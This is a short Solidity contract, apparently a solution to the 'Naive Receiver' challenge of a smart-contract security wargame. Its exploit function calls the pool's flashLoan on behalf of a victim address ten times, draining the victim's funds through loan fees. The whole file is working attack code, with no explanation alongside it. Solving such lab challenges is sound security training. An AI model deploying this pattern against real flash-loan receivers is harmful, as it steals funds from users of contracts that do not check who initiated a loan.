import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackerNaiveReceiver {
    NaiveReceiverLenderPool pool; 

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function exploit(address victim) public {
        for (int i = 0; i < 10; i++) {
            pool.flashLoan(victim, 1 ether);
        }
    }
}
